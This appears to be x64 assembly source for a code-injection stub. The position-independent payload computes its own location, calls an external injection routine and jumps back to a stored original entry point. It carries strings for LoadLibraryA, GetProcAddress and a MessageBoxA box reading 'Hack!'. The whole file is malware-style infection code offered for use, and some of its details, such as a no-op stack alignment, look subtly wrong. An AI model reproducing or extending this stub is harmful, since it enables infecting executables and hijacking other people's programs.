public __begin_of_code
public payload
public delta
public __kern32
public __kern32_str
public __loadlib_str

public __getproc_str
public __user32_str
public __msgbox_str
public __msgbox_title_str
public __msgbox_content_str

extern main_inject: proto
inject SEGMENT READ EXECUTE

__begin_of_code:

payload proc

    ; delta offset
    call _next
_next:
    pop rbp
    sub rbp, _next - payload
    sub rsp, 64
    and rsp, -1

    push rbp
    push rbp
    pop rcx
_follow:
    call main_inject

    push rbp

    ; call to old AOE
    mov rbx, [rbp + (delta - payload)]
    add rbx, rbp
    jmp rbx

vars:
    ; delta to old AOES

delta label QWORD
    dq 0
__kern32 label QWORD
    dq 0

__kern32_str label BYTE
    db 'c', 0, ':', 0, '\', 0, 'w', 0, 'i', 0, 'n', 0, 'd', 0
    db 'o', 0, 'w', 0, 's', 0, '\', 0, 's', 0, 'y', 0, 's', 0, 't'
    db 0, 'e', 0, 'm', 0, '3', 0, '2', 0, '\', 0, 'k', 0, 'e', 0, 'r'
    db 0, 'n', 0, 'e', 0, 'l', 0, '3', 0, '2', 0, '.', 0, 'd', 0, 'l', 0
    db 'l', 0, 0, 0

__loadlib_str label BYTE
    db "LoadLibraryA", 0

__getproc_str label BYTE
    db "GetProcAddress", 0

__user32_str label BYTE
    db "user32.dll", 0

__msgbox_str label BYTE
    db "MessageBoxA", 0

__msgbox_title_str label BYTE
    db "Title", 0

__msgbox_content_str label BYTE
    db "Hack!", 0

payload endp
inject ENDS
END